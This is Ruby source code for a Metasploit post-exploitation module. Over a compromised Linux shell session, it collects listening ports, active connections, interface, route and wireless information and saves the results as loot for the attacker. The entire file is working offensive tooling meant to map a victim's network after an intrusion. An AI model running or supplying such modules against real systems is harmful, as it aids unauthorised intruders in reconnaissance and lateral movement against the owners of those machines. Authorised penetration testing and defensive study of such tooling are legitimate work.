require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux Network Information',
				'Description'   => %q{
						This module will gather information on listening network
						ports, active connections and other general network information.
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'ohdae <bindshell[at]live.com>',
					],
				'Version'       => '$Revision: 14774 $',
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ "shell" ]
			))
	end


	def run

		distro = get_sysinfo
		print_good("Info:")
		print_good("\t#{distro[:version]}")
		print_good("\t#{distro[:kernel]}")

		print_status("Collecting data...")
		
		get_network_info()
		print_status("Module finished!")

	end
		
	def save(msg, data, ctype="text/plain")
		ltype = "linux.network.info"
		loot = store_loot(ltype, ctype, session, data, nil, msg)
		print_status("#{msg} stored in #{loot.to_s}")
	end


	def execute(cmd)
		vprint_status("Execute: #{cmd}")
		output = cmd_exec(cmd)
		return output
	end


	def get_network_info()

		print_status("Finding open network ports...")
		open_ports = execute("/bin/netstat -tulpn")

		print_status("Finding active connections...")
		connections = execute("/usr/bin/lsof -nPi")

		print_status("Gathering misc. network information...")
		ifconfig = execute("/sbin/ifconfig -a")
		routes = execute("/sbin/route -e")
		updown = execute("ls -R /etc/network")
		wireless = execute("/sbin/iwconfig")

		save("Open ports", open_ports)
		save("Active connections", connections)
		misc_info = (ifconfig + routes + updown + wireless)
		save("Misc information", misc_info)
		
		
	end
end
		

